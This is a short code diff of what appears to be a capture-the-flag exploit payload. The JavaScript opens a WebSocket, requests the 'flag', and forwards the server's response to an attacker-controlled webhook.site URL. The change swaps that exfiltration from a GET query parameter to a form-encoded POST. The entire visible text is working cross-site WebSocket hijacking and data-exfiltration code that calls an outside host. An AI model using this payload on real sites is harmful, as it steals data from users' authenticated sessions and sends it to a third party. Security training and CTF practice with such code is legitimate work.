@@ -14,10 +14,16 @@
             ws.send("flag");
         };
 
-        // Step 3: Listen for the response (the flag) and forward it to your Webhook.site URL
+        // Step 3: Listen for the response (the flag) and forward it to Webhook.site via POST request
         ws.onmessage = function(event) {
-            // Send the flag to your Webhook URL
-            fetch("https://webhook.site/e557236e-aff5-4af6-9d50-1f7c6025810d?q=" + encodeURIComponent(event.data));
+            // Replace YOUR_WEBHOOK_URL with your unique Webhook.site URL
+            fetch("https://webhook.site/e557236e-aff5-4af6-9d50-1f7c6025810d", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/x-www-form-urlencoded"
+                },
+                body: "flag=" + encodeURIComponent(event.data)
+            });
         };
 
         // Optional: Close WebSocket connection after receiving the message
